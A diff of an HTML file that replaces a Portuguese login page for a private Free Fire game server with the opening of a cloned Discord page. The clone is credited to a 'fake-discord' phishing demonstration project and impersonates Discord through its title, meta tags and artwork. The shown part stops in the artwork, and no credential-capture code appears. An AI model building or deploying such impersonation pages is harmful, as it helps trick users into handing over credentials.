@@ -1,297 +1,264 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
+<!-- #                         by [Ali Milani Amin] -->
+<!-- #             ~> https://github.com/AliMilani/fake-discord -->
+<!--                                MIT License                   -->
+
+<!-- This is a Fake Page just to demostrate how phishing works -->
+
+<html lang="en-US" style="font-size: 100%; --saturation-factor: 1"
+  class="full-motion disable-forced-colors theme-dark platform-web font-size-16" data-rh="lang,style,class">
 
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>RZIM SERVER - Login</title>
-  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #b00d1a 0%, #7a0812 100%);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 10px;
-    }
-
-    /* BANNER DE AVISO */
-    .disclaimer {
-      background: rgba(0, 0, 0, 0.8);
-      color: #ccc;
-      padding: 10px 15px;
-      text-align: center;
-      font-size: 11px;
-      width: 100%;
-      border-bottom: 1px solid #333;
-    }
-
-    .disclaimer strong {
-      color: #ff3b4e;
-    }
-
-    /* CONTAINER PRINCIPAL */
-    .container {
-      background: linear-gradient(145deg, #1f1f1f 0%, #141414 100%);
-      border-radius: 15px;
-      padding: 25px;
-      margin-top: 15px;
-      max-width: 380px;
-      width: 100%;
-      border: 1px solid #333;
-    }
-
-    /* LOGO */
-    .logo {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .logo img {
-      width: 120px;
-      height: 120px;
-      object-fit: contain;
-      margin-bottom: 10px;
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .logo h1 {
-      color: #b00d1a;
-      font-size: 24px;
-      margin-top: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-    }
-
-    /* TERMOS */
-    .terms-box {
-      background: rgba(255, 100, 0, 0.1);
-      border: 1px solid #e50914;
-      border-radius: 8px;
-      padding: 12px;
-      margin-bottom: 15px;
-    }
-
-    .terms-box p {
-      color: #e50914;
-      font-size: 11px;
-      margin-bottom: 10px;
-    }
-
-    .terms-box label {
-      color: #ccc;
-      font-size: 11px;
-      display: flex;
-      align-items: flex-start;
-      gap: 8px;
-      cursor: pointer;
-    }
-
-    .terms-box input[type="checkbox"] {
-      width: 18px;
-      height: 18px;
-      margin-top: 2px;
-      accent-color: #e50914;
-    }
-
-    /* FORMULÁRIO */
-    .form-group {
-      margin-bottom: 15px;
-    }
-
-    .form-group label {
-      display: block;
-      color: #e50914;
-      font-size: 11px;
-      margin-bottom: 5px;
-      text-transform: uppercase;
-    }
-
-    .form-group input {
-      width: 100%;
-      padding: 12px;
-      background: #0a0a0a;
-      border: 1px solid #333;
-      border-radius: 8px;
-      color: #fff;
-      font-size: 14px;
-    }
-
-    .form-group input:focus {
-      outline: none;
-      border-color: #ff3b4e;
-    }
-
-    /* CAPTCHA */
-    .captcha-box {
-      margin: 15px 0;
-      display: flex;
-      justify-content: center;
-    }
-
-    /* BOTÃO */
-    .btn-login {
-      width: 100%;
-      padding: 14px;
-      background: linear-gradient(135deg, #e50914 0%, #ff3b4e 100%);
-      color: #000;
-      border: none;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: bold;
-      cursor: pointer;
-      text-transform: uppercase;
-    }
-
-    .btn-login:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
-
-    /* MENSAGENS */
-    .error {
-      background: rgba(255, 0, 0, 0.1);
-      color: #ff4444;
-      padding: 10px;
-      border-radius: 8px;
-      margin-bottom: 15px;
-      font-size: 12px;
-      display: none;
-    }
-
-    /* FOOTER */
-    .footer {
-      text-align: center;
-      margin-top: 15px;
-    }
-
-    .footer a {
-      color: #e50914;
-      font-size: 10px;
-      text-decoration: none;
-    }
-  </style>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Discord" />
+  <meta property="og:title" content="Discord - A New Way to Chat with Friends &amp; Communities" />
+  <meta property="og:description"
+    content="Discord is the easiest way to communicate over voice, video, and text.  Chat, hang out, and stay close with your friends and communities." />
+  <meta property="og:image" content="banner.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:site" content="@discord" />
+  <meta name="twitter:creator" content="@discord" />
+  <link rel="stylesheet" href="style.css" />
+  <title>Discord</title>
+  <link rel="icon" href="fav.ico" />
 </head>
 
 <body>
-  <div class="disclaimer">
-    <strong>AVISO:</strong> Este é um projeto independente. Não é afiliado, endossado ou conectado à
-    <strong>Garena</strong>, <strong>Free Fire</strong> ou suas subsidiárias.
-  </div>
-
-  <div class="container">
-    <div class="logo">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAb4UlEQVR4nO2dCZBkVZWG//Py5VbVTdvdLOKC48KigDPADCLuA4gGzjCIEhrqSAzigqLoCI46jE4Yo6ETLAMSbqioSICC4w6I6LjiAqKyyzYOgohg03ZV5fbynYlz896q7OraK6vqvXz/15HRWVmVWS+z7vnvueeee45gbSgBEADJtMdHa7XaUwHsoSoHiOBAVd0oIusA7LNG10rIYlAb26p6H4D7AOlEEa5JU/wGSO8ol8u/Ghsbe3Dac2L/vNT/v2rIKv+uaNqbLNXr9QNU9dkADgfEjPzxUz++qp8FISvE1FhW1QdE5EZVXAukV6xbt+7ahx56aNu0yTGIwVAIQDD8bnigVqsdqiovFsFRNrOLCNR9PpMGH0QiXJ+sslgRsly0b0CHsTw5jntjXu12r4hclab4crvduAJAazWFQFbL8EdHR3dLEv17QI8XwaHhA/Bvstv34dhzCBlWtG+Cs7EemS24b6jeCsjFaZpc0m63b+0TghVbGqyUAJS2N/z0DYC+XiTazb+PYPTuA1ihayAkD6T+NikGqmpewEXdbnRmpzN+Y1+coDtoIRi0AIRZ3N5QpVarnaaKk0WiXf11h5meRk/IjoSZvuSFoA3g8yI4vdFonO2/tyxvYDlr8aBAabVaf6+IXuGNP8z6XOcTMhikLwhoy4KzqtX6JRs2bNg49djSX3gpONWxC2g22x+NIjlOVUNggoZPyAp7AyISq+r13a6c0OlMXA+g7OMDKy4AfcbfujKKor9R1Y6/AELI6pB4r2CLCI5sNBo/D0uExbxItBTjL5dHDmi12leLCI2fkLUhLAk2quLKWq12XJ8orIgH4Ix/dHR0/243/Z794uWuPwghyyYkEZk5H99sTnxmMcuBhQqASz4wt7/Vapvx778UtSGErGgCUUsEz/XLgQXtDkQLPcoU1vze+MOWBCFk7Ym8nY7YcqBer/91X6r9vE+cD3cqqdlsfcICfn2ZSISQ7BD1xQS+sH79+s3TTtTO+qS5cFFF2+ePouhYRvsJyTQlvzR/fKeTXNx34nBWovlerFqtHiGC96iqvTC3+gjJNj5bUA63iXu+5brMJQyjo6M7J0n31yKy60LUhBCSGVwMQDU9otVqXT1bUHA2g3b5/UmSfjiK7Ax//1YDISQHuHM6ItHHNm/G+tniATMZtVOKer3+UhG81Lv+DPoRks+g4BPHx2sfmG0Sl1lO98W1Wt0qkTyJrj8h+S8/lqbxfu32ttumFxSZrgjum7XayKkA9qTrT0iuCRN8HEXJOXP9wOT99evXb2q3O78RkY0z/AwhJH+4lH3V9HmtVut/+gOC0fTz/e12cnIURZv6inoQQoYAkeg9/u5kFaH+uvtYt27d5k4nuVVENk37PiEk37gg4HQvIOpP9+100mNEZLP/YRo/IcND2us/EL22/8EgAH6LID2R/bgIGUpK6kp069+NjIxM1u2MQueRer1+sIgcFOqSr/XVEkIGik3/3SiK1qVp+gr/WDzZmSdNcaylDa1WU0JCyKpjXYutD+dLJgXBnx6qiuBo38SDKb+EDCcu1ieCAyuVyl422butv5GRkacw64+QQtAVicoi8nxMuf/pYdILEQ6k3RAhJLOIOfoicpjZfygmeFjP++fWHyFDTmRxflU8fePGjeujXXbZZR2AvX1yEPf+CRluXI1PS/VvNpv7RGNjY7b+34On/ggpDCkg5W5XnxOp6pNCdHCtr4oQsnpEkewdqcr+3vOnABBSDKQXB9CnmgdwENf/hBSKEOvbKxJBOPlHCCmQAIjITrYNuK7/QUJIYVCp1epc+xNSUJj3T0iBoQAQUmAoAIQUGAoAIQWGAkBIgaEAEFJgKACEFBgKACEFhgJASIGhABBSYCgAhBQYCgAhBYYCQEiBoQAQUmAoAIQUGAoAIQWGAkBIgaEAEFJg4rW+gCxjRRKpkIsj1JfrrzPHmnPZhQIwBy3XQoXDd3H0asuWvHhG/r6EnlT+p7TvRtYOCsAMhDbJeyLCHhB0WDJ5QaQAGlCMA9jm/7evJ9x3tzd1gaDsB6DrUe+fT0FYXSgAM1DyA/dVEuPdqOJBpPygFoAZb8d7TnabgOJhKLZA8Qco7oPiHih+qyl+hxT3Q7F18pkmBIKq//xTfyMrCwVgDtoAxqAY4we1KO/JBlUFwAYIHgNByd16M70ZdUd6HsIDUNyFFDchxfWa4kZ08X9QdJ0gCOp9z6FnsDJQABYQBAw3sjD6Z++e4erkej/EAsz9/wsI9kKMF3lReAiKW5DiB+jiak3wS6RIoCh7z8CWZRSCwUIBIAOnv8XUbO2mUr9MsKWWeoEdAfAMlPA8lPBWKTsB+BISfFkTPIDUCUHFCwEZDJzYyJoQPIFSXyCw65dcD0KRAHgaIpyJKq6WOt4hVTwCgnEot2cHCAWAZG7JFfv7FnuxZcGuEPwbKvi21HG8lL3nQPd1EFAASGYJYmA7C+YV7A7Bh1HDF6WGJ0Kct2AeBFk6FACSm52FlvcIjkCMK2UE/yBltySwQczW1kuDAkBy5xFYXoH1tL8ANfyzVFy+gUERWDwUAJI74r4cjfehiv+QqosJGBSBxUEBILkeuBYbeBsqeL8Tgd4OAUVg4VAASG4J24h/hOIUlHGqXw5wUC8cflZkKAaxBQdPRxUv8YFB7g4sDAoAyT3B5TfDPwNV7IvILQc4uOeHnxEZmoHc8QeQzpIaqhCXbsx4wNxQAMjQYG7/ViieiRLeJGU06QXMCwWADJ0IWA2Ck1HBPojQ5CCfEwoAGSrELwU2QvA2qfjaAmQ2KABkKBOFbClwNGIchBIDgnNAASBDiQUARyB4jZQnC5GQHaEAkKEd2JYq/ALEeAJKLhZAEdgRCgAZSsSfF9gFghdJycUCmBy0IxQAMtSDuw3FC1Fy5cRYSmxHWBMwx6xE6ezp9fzyfLjGBMBOCe6PEvZChJuRukrDLDc+BQUgp1hgaxRADTKQIFd/x54gLOY225Za0mc0eSu+YbP+JggOkRJu0q7rPUABmIICkEPMSOsQXIUEP0MXlQEMahsIVnp7FIINADZDsDMEuyLCJv/77HfYabt2zoRAfYHRT7Ks+A5QAHKIGWINwFXo4nxtrZApivMwLKHmcRDsLyUcihIOQYRHIXJCYJH1Ui6CgYqnIHLbgkmOhGs1oADkfAkQQ7DOD+xBvGb/fXvN30NdG68faRcfBfAYRDhaYrwGZTwJkSvPVcrBbsCjEbmiondDnXhyGdCDuwA5JvVGOqhbt++W+sFhjThGvMjY/yYI52kbh+sELkDH1epPMy4A9t52guCxiFy3Z3oAU1AAyKyEdl5BaFIvCCYGfwZwsjbxn2g7EcjyFpv6636s0PSnQwEgiyIsDay3n3kE79MWLkTHxQqyKgKh9djufrhTBqagAJAlEdx+24E4XVu4E2lm19biRWBn/zXPB05BASBLJiwJrDLvx9BxHoFm+FqtWhDZHgoAWRZdvxPxVU1wH9QJQlZFwAQKGb6+tYACQAYSYLsXKa5D1xlZmuHrJNtDASADG0S/RupyArI6w3IBsCMUALJsgsH/FqlbEmTV0AaRLDVsUADIwNiimtlS3HZNLTYR3QEKABkYrYy7/9vW+iIyCAWADIx6Rmf/kAhk5xaQ0WtcKygAZGDsLuJOl2XRC7BreiCTV7a2UADIwNg3o+cCbZBbcPIe7QkAZWAKCgAZSHTdDggd4qrvZq8pp12P1S+4x4coKQBTZO1vRXJG7KPrz0EJT3aFQrK1xlZ/cOlBX9cgq0uUtYICQJaMeNfaKu6+SSqZbMDRywAU3IEUD2U8VXktoACQJWOzaQOK10rZdeTdlkH3X/11/gJpZnMU1hKWBCOLRvzAMYM/DDFORyWTxt9fEuzH2qtWwNl/e7L4NyMZNaTIG76Zkhn8kYjxKbHC5L3Hsja7qq90bCnKv0DXLVUoANtDD4DsgEy7hZJgbW9WVv3n7VLFKSi774Uy4VltEPo9JC4JaDTDVYvWCgpAjjHjtJ33QZ7ACyW/rCGITr6qYCOAv0KEv5UYL0GMfRC5FtyheCgym/8P/LeyGPhsUAByShjc1r1n64Bfez0Ej0eEPX0/gKciwt6I8GjXK0Bc4O9Pvhx4Vo3fhGkd4BqnXIOuK1fG2X9HKAA5NX6bofdEhGcgdl17ust4LTP4R0qvAcgTEDnjf6TrECRuD73n/qsTHDN8M/ps5vxNj/6LK11u1073f2YoADnEDHAMin9EjBOkvOwFgPXLCwZtQtLx7b8s0Be2zkIrsKwbvmHXbAZvFYq+ogmqXPvPCgUgp4TtrXDGfTlMrfWnXjsYfVZd/IXs/Z+BtksB5uw/OxSAHJPn1t0rhXkwtkvxJST4uiZuF4Br/9nJo8ATMmfhTzv2++/acksbMjf0AMjQENb+p6CJu5AOrGnqMEMPgAwFtiuyMwTno4OLtdekhMY/PxQAMhTGvxmC76CLd2nLRf2Z8rswKAAk19gsb92Jb0KKE7XpxCDLvQmyBgWA5BYzdktWuhspXq4N3A91h3+y2Jkoq1AASG6NfxMEtyHFsdpwIjDCdN9FQwEguSIcVtoFgh+ji2O04SL+TPZZGhQAkhu6fn1vAb/PouNmfnP7afxLhwJAcjPr23rf/n8LmniDNt19nvJbHkwEIpk2/K43ckvv/TYS/Ku2cYNvQ27fZ8BveVAASOYwo1Zv+Obe34kU70ILF2ji6h8ww29wUABIZow+9Wt8K+RR9oZ/ITr4jHbwAFJX98D+McNvcFAAyJoQ3PdwdNe28CyDbxyKa5DiUnTwVe3iQaRODEKgjwk+g4UCQFYdO6NX9gYfyovfiBRXo4vLNXE1/M3VN8Nf5w2fR3pXBgoAWZOIvpUWuxVd/Agpvq+JS+W1voImD9Zm3I7yhmrEZOWgAJBVr2L0KXTwSe3gPh/Dt3W9LQFstg+xAM74qwPzAMiqN+o4EWVcIjW8R6o40FcZtLU/i3evPhSAnBvUTLcsE4J+T0GE01DB16SOi6WGo3yTEROCUI+QrDz8nHNMyQfTws0Mq7+6bzejiTImAhO+ZbfxAsT4vNTwDanjxVJ2ywQr5pmHCsR5hwKQU8QbkbW8/pO/PQx1j5X8GflNfm2dxTV16DNoWIehP0NxECJcgBoukxr+EiXnDYRy5GRlYBAwx5Vvz0ILH9eO2yNPvOFbBN0M35p7HCQRDkUJ+yJyW2pmZJpB1Q8z/bgvUf48xDhYSjgdbXxS2y7tFzlY3uQRCkDOPYCtvmNP2C6z2f4uKK5FF19UEwTBISjh1RLjKMQoQVxTkSy610GYzJOxJc05qGJXEXxAWxSBFSJrkwFZBKW+pJpwsyi7uf3mFdjNZs3vIsHx2sSx2sT16DrvIWtLgumzUuqXN6ejgndKxcUEOFgHDz/TIdwFCGv+YORBDL6PBEdpw+3Db8q4CISdABOBd6OKk6TiYgJ0WQcLBaAABDEIHsFbtImPexFIctD5yJYE70fF7RDY8oUiMDgoAAWsqFOD4FRt4htI3HIg6yJgotUAcC6qOBilzMYw8ggFoGDY8qC3tSbOEwjFNLOYLxCIfBFQi298Qmp4NCIX+OTgXT78DAtI6o3J6umdpi3EOdhpL/ltQtve/IhU3dehdTlZOhSAghJiAlciwQVoZ34pYNjafwsUhyPGe6XiTg9yAC8Pfn4FxmZQSxD6oHbwv0hdCS7NgQhYCvEbUcFxUnY7A4wHLB0KQIEJp/PuR4oz0M5NeW0btJYX8CFUsQ8iFyDkQF4a/NwKTq+0tuAiTfATdLE+ByJg6/6WP+9wptRcAhTjAUuDAkCcC92C4gxt5+bwTezToJ+LEk6WMuMBS4QCQNyMb2cGvoXE1d7fKQdeQBAuSxI6BRXsixJFYAlQAMjkQDA3+kztoJ2T6Lr0dQh+h1RyIVpZIw9/Z7KKXsCPkeDLSCbbcOVhKWBegJ10fBZiFhJZJBQAssOAOFs7bn2dl5z7UGbszVJ215/1rcwsQQEgk6TeC7gJXVyExEXZk5zEAqzYyWGIXTERlhNbOBQAMsNsKjhP2/g91OUJ5GFGDZWOzAsI9QTI/FAAyIznBH6LFOejk4u8gH4v4DmI8XzEaDBDcEFQAMiMIlCB4Hxt4w7XlDM/M6p5AidLxV1/HoRrraEAkBmNqOJz7s9Dx9XjS3PiBVifwWeghKMkdnkBPCcwNxQAMiNd37zzIu3gl+i6lt1pTnIDLHD5JpRdijO9gLmhAJA5t9as+s5/oeNODWpOBrRds1UOOppewLxQAMi8yUFf0QQ/RJKbgGCvCak6LyAvJxzXCgoAmXeAmDGdoZZ0m4+DQpGvHnQASjiWXsCcUADInNjsaUHA7yDB5T5FOA8zqgmVBQFPQsUdbmLn4ZmhAJB5CbP+mdp2++tRjryA/RDhZVJ2x525I7Ajefhbkox4AdZu7NIceQE2uE2wXocyNiJyXYfzsIRZTSgAZEHYDoD1FTxH264wp+0QaC5Kh8GVDXulxC6WQS9geygAZEFYDoAVDb0NKT6LTm68gF45ccWJKGNn30+AXsAUFACy6CrCH9EO7slJFWEzdisa+kREOF5idHISw1gt+FmQRVcRvhep6y24LkdegCUH/RPKeCRjAdtBASCLwgzeDtp8Wju4NQdtxaa2BIHHIcIJUqYX0AcFgCzpoJAFAs9F22UKZl0A+g8KvRoxHstYwCQUALLkXgKXaOK2BtfnQARCLwFrLHqilJEwFuCgAJAlz6i2x34WOu5+1oOB/UVDXomyazLaogFQAMjyDgp9QxN8Nye9BHqHhIDdIHi99wIExYYeAFnW4DEjsl4C3ZwMJvMCrOLxy1HGXohccDAP171SFPm9kwGlCH8fCb6eIy/AzjVuguAk10yk2F4ABYAMZBDZQaGxnKTahr6CL0WM/QreUqyo75sMuJfAr9DFJTnqKGSeyk4QvFHK7n5RvQAKABnYQaFztY0HoC5PQHMSCzgGsSscUtQy4hQAMrCDQnchxafRyUUsIFz3KMS1F09zIForAQWADPSg0Me1g7tzclCo5L2AFyHG0wrqBVAAyEAPCv0BKT6So4NCqc9qtGYiyIFoDRoKABl4L4HPaQc3IMVoDg4KlXx24AsR45kFbCxKASAD7yVgBnUO2k4M8jCjpgVuL04BIAP3AsylvkwTXOM6CmV/KVAqcHtxCgAZOGY8VoX3LG3nZoBpQduL5+Xvs2aDIs3wTTN+UOhKJLjKpwh3MvB5zXUTAA9D8SzEOLxA7cVN7MgsWFzYXFhLFY0zZmB2Br8Xt84mYS1tHYUOlxgbkH26EBe4fJdU8EPtTjYTyarQDgKp1erD/P6WhHgjszPje/jZSzIYbLPEm9/5mSqrf0SbXQ9ANBkLyNLnOHtWI3A90smzDVn9bAcBBWAO7Ox4muE/v6XflpGPqrx5M6MKpBDr4yx5tpnDEluiDM9ZWY4DBOz6rHCoZPhznIms71wMCgrAPIO3KANhJSlKRD2PFMHLIYTMAgWAkAJDASCkwFAACCkwFABCCgwFgJACQwEgpMBQAAgpMBQAQgoMBYCQAkMBIKTAUAAIKTAUAEIKDAWAkAJDASCkwFAACCkwRWuDQAiZJgD5qtVECBkYkare5+/TEyCkgB7APf4+BYCQghEBwpqNhBSTTgToz30YgB4AIcXATfqqelsM6M3+QQYDCSkG6s39lkhEbvGTPwWAkGJxcxTH8S2q+ocC9EEkhPSwpX8KpD+JxsbG/gjIrd4BYECQkOHGJnlR1T+Xy+XrQirwT6W3AKAHQMhwk/Yme7lxbGxsixMAEf2mqrN9ng0gZLhRm+xF9FsAEpcKXK/Xfwm4OADPBhAy/Nm/KiJXuS+szfyWLVu2qsoVIsKGuIQML6m3+dsbjcZ1NvlPuvyqcqkJA5cBhAwtqYhAFV+zLEAAsQlAYkrQbk9cDeBOvx3I3QBCho+SqiZxHF3gv+4GD6AEoKGKC8UkggJAyLDR9f//YHx8/Ebv6adBAPyMn35OVVteELglSMgQ0Zvc9Xz/pbP9fgEotVqtO1VxCZcBhAxf8M8O/zSbzS95++5O3/f3GULd9wMwL4CpwYQMB862AfkAgGb/dn80XSXa7fZtqrg4rBHW7poJIQPc+rut2ZzYwa6jmZSiVJJ/UdU/0QsgJPd4z17ePJNnH82kFhMTE/eLRGeKuDyBED0khOSLrg/oX9VqTXzL39/OnmeqARCSgUrVau0nInJA3wsRQvKB+gl9QjU90AL8MwX3o1meaLd2qRSd0KcY3BYkJD+4SVsV72y1qtxnmW8jub/c5XBsyemFSrtUujKDrW0gj9Y4SQbEf9765WKwdt3br14bk8+PnO/5tqRLVa9URVvWEuJSGErDnBxZ8QwXFbt27dMt9OXrSQLQR7oVIpegWALX45wPwAQrJFiN1Zr4+TGo3GtX7CntNWo4UGE8bHx28QwZFeBAyKACHZwAzfluclVXltsznxmbB8n++JCy0BZiJQbjQaPxfBib6OADMFCcnIdp+IlFX17FZr4hNmqwsx/sXWAHQFBBqNxmWqXdse3Oafz5gAIWtDGnbsVNOzW63mWxc68weW0gzEbQnW6/WDVXEFgI3+F3J3gJDVYzI5z9x+P/Mv2itfShXgsBz4mY8J3G57jotRHULIsnDrffPCVdMT+tz+RcflltMOzHkC69ev39zpJJ8HnBiEC2B5cUIGjyva65N8bhfBK20iXqzb30+0XBdk27ZtDzWbjRcA8l7/eqHOIFOHCRkcXV/UJ05T/UK5HD99ucY/qIagrs2Izf7V6siRInqOiOzlG43wEBEhy8N71bbzpltVcXqr1TjXf2/ZKfqD7AgclGhDrTbyPkBfB0il14TQeQM8TUjIwpluN5enaXxKu73tN30VfZbtZQ+6JfikIpXLo/uVSumHALxw2huKVuD3EjJMR3iNUq+Gv96YpnJauz1xuXt0wAfzVsIQQz0Bd5HVavUIkehUAEf0pSW7XgQUA0K22893W+nB8FXlrFZr4kI7mj+tgO/AWMmZeDs3xYQAiF4lgqNFZCcfIzAoBqSoM736Gd1V7FZVmzS/A+iFzWbzYm/4WMnj+KvhiofDQ87i6/X6Y1T15apyjAieZmXHelowKQjdacFFLhdI3kn7BvjkEtgbvd29RRXfjOPos+Pj47+ezXZWgtU0rhDMmFSySmXdk0ul7hGq+lxVPF1EdqPBk2FHVR8C5GYRtQ693242mz+bNvGFjL4V30pfi9k15Ap0t3+DGx5Rq7WeDODZAJ6gigNEZG8AO03VNSckd3QA3KiK2y1rFpAflsvRdWNjY3+c9nPh6O6qnrL9f6rzhWayN9BfAAAAAElFTkSuQmCC" alt="RZIM SERVER Logo" style="width: 150px; margin-bottom: 10px;">
-      <h1>RZIM SERVER</h1>
-    </div>
-
-    <div class="terms-box">
-      <p><strong>AVISO:</strong> Este servidor privado NÃO é afiliado à Garena ou Free Fire.</p>
-      <label>
-        <input type="checkbox" id="termsCheck" onchange="checkTerms()">
-        <span>Li e concordo com os Termos de Serviço e Política de Privacidade, e entendo que este é um projeto independente.</span>
-      </label>
-    </div>
-
-    <div class="error" id="errorMsg"></div>
-
-    <form id="loginForm" method="POST" action="/oauth/login">
-      <!-- 
-        O campo state agora está vazio no value, 
-        vamos preencher ele dinamicamente via Javascript abaixo 
-      -->
-      <input type="hidden" name="state" id="stateInput" value="">
-
-      <div class="form-group">
-        <label>Usuário</label>
-        <input type="text" name="username" id="username" required placeholder="Digite seu usuário" autocomplete="off">
-      </div>
-
-      <div class="form-group">
-        <label>Senha</label>
-        <input type="password" name="password" id="password" required placeholder="Digite sua senha">
-      </div>
-
-      <div class="captcha-box">
-        <div class="h-captcha" data-sitekey="94bea0ac-d6dc-45ec-adce-d2fe24f06076" data-theme="dark" data-callback="onCaptcha" data-expired-callback="onCaptchaExpire"></div>
-      </div>
-
-      <button type="submit" class="btn-login" id="btnLogin" disabled>ENTRAR</button>
-    </form>
-
-    <div class="footer">
-      <a href="/terms">Termos de Serviço</a> | <a href="/privacy">Política de Privacidade</a>
-    </div>
-  </div>
-
-  <script>
-    // ----------------------------------------------------
-    // NOVO SCRIPT: Captura o State da URL
-    // ----------------------------------------------------
-    window.onload = function() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const stateParam = urlParams.get('state');
-      
-      // Se existir o state na URL (enviado pelo jogo), injetamos no formulário
-      if (stateParam) {
-        document.getElementById('stateInput').value = stateParam;
-      }
-    };
-
-    // ----------------------------------------------------
-    // SCRIPT ORIGINAL INTACTO
-    // ----------------------------------------------------
-    var termsOk = false;
-    var captchaOk = false;
-
-    function checkTerms() {
-      termsOk = document.getElementById('termsCheck').checked;
-      updateButton();
-    }
-
-    function onCaptcha(token) {
-      captchaOk = true;
-      updateButton();
-    }
-
-    function onCaptchaExpire() {
-      captchaOk = false;
-      updateButton();
-    }
-
-    function updateButton() {
-      document.getElementById('btnLogin').disabled = !(termsOk && captchaOk);
-    }
-
-    document.getElementById('loginForm').onsubmit = function(e) {
-      if (!termsOk) {
-        e.preventDefault();
-        document.getElementById('errorMsg').textContent = 'Você precisa aceitar os termos!';
-        document.getElementById('errorMsg').style.display = 'block';
-        return false;
-      }
-      if (!captchaOk) {
-        e.preventDefault();
-        document.getElementById('errorMsg').textContent = 'Complete o captcha!';
-        document.getElementById('errorMsg').style.display = 'block';
-        return false;
-      }
-      document.getElementById('btnLogin').disabled = true;
-      document.getElementById('btnLogin').textContent = 'ENTRANDO...';
-      return true;
-    };
-  </script>
-  <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"ae9c55ebb8254af792b0a9b3e16a10ed","r":1}' crossorigin="anonymous"></script>
-</body>
-
-</html>
+  <div id="app-mount" class="appMount-2yBXZl">
+    <div style="position: fixed; opacity: 0; pointer-events: none"></div>
+    <div class="app-3xd6d0">
+      <div class="characterBackground-1BPOOJ">
+        <a href="/" target="_blank" rel="noopener" class="logo-2Rw1Ex logo-3ac3fP"
+          style="opacity: 1; transform: translateY(0px) translateZ(0px)"></a><svg class="artwork-L5TAwQ"
+          preserveAspectRatio="xMinYMin slice" xmlns="http://www.w3.org/2000/svg"
+          xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1700 1200">
+          <defs>
+            <linearGradient id="linear-gradient-2" x1="1512.99" x2="1503.54" y1="519.46" y2="476.33"
+              gradientUnits="userSpaceOnUse">
+              <stop offset="0" stop-color="#ffe75c"></stop>
+              <stop offset="1" stop-color="#ffc619"></stop>
+            </linearGradient>
+            <linearGradient id="linear-gradient-3" x1="1441.31" x2="1426.37" y1="493.59" y2="538.11"
+              xlink:href="#linear-gradient-2"></linearGradient>
+            <linearGradient id="linear-gradient-4" x1="1170.7" x2="1126.43" y1="805.19" y2="847.49"
+              gradientUnits="userSpaceOnUse">
+              <stop offset="0" stop-color="#d11583"></stop>
+              <stop offset="1" stop-color="#eb50a4"></stop>
+            </linearGradient>
+            <linearGradient id="linear-gradient-5" x1="693.92" x2="693.92" y1="1235.03" y2="1193.91"
+              gradientTransform="rotate(-21.3 -1852.872 -1403.071)" gradientUnits="userSpaceOnUse">
+              <stop offset="0" stop-color="#66bcff"></stop>
+              <stop offset="1" stop-color="#8cd9ff"></stop>
+            </linearGradient>
+            <linearGradient id="linear-gradient-6" x1="-6.39" x2="-57.56" y1="1177.84" y2="1139.89"
+              gradientTransform="rotate(-4.2 -13157.002 -13444.26)" gradientUnits="userSpaceOnUse">
+              <stop offset="0" stop-color="#ffc619"></stop>
+              <stop offset="1" stop-color="#ffe75c"></stop>
+            </linearGradient>
+          </defs>
+          <path fill="#5865f2" d="M0 0H1700V1200H0z" data-name="Layer 4"></path>
+          <g data-name="Layer 5">
+            <path fill="#6270fc"
+              d="M935.8 386.9c-2.1 0-4.2.2-6.3.3a126.6 126.6 0 00-176.9-48.4 126.3 126.3 0 00-225.3 48.3 64.7 64.7 0 00-8.6-5.8c-34.2-19.9-78.7-7-99.3 28.6-18.4 31.7-11.6 70.9 14.4 93.1-14.2 9.1-23.3 23-23.3 38.6 0 27.4 28 49.6 62.7 49.6a74.7 74.7 0 0034.9-8.4A126.4 126.4 0 00746 550.7a126.2 126.2 0 00166.8-20.2 73.6 73.6 0 0096.7-69.9 73.7 73.7 0 00-73.7-73.7z">
+            </path>
+            <path fill="#6270fc"
+              d="M1210.9 311.8A65.4 65.4 0 001173 324a73.7 73.7 0 00-139.8 32.4 78.3 78.3 0 001.1 12.9c-32.9 15-64.1 40.2-87.4 72.8h264a65.2 65.2 0 000-130.3z">
+            </path>
+            <path fill="#707cff"
+              d="M1035.5 617.4a115.9 115.9 0 10-199-109.1 117.7 117.7 0 104.3 194.1 76 76 0 00137.2-.7 51 51 0 1057.5-84.3z">
+            </path>
+          </g>
+          <path fill="#6a77fc"
+            d="M990 243.1H579.4a3 3 0 01-2.3-5c24.6-29.4 61.4-30.9 101.2-23.2 22.4-86.3 123-85.3 157.3-32.2 36.6-28.2 159-31.3 160.2 54.5a5.8 5.8 0 01-5.8 5.9z"
+            data-name="Layer 25"></path>
+          <path fill="#6874f7"
+            d="M57.9 530.5c89.2-45.1 152.1-10.2 152.1-10.2 44.1-13.7 83-4.1 103 11.6 12.5 9.7-15.5 8-78.3 8H60.2a5 5 0 01-5-5 4.9 4.9 0 012.7-4.4z"
+            data-name="Layer 24"></path>
+          <path fill="#6874f7"
+            d="M1525.8 824.6a34.7 34.7 0 00-66.9-12.1 33.3 33.3 0 00-7.8-.9 36.3 36.3 0 00-27.8 13h102.5z"
+            data-name="Layer 23"></path>
+          <g data-name="Layer 22">
+            <path fill="#4452f2"
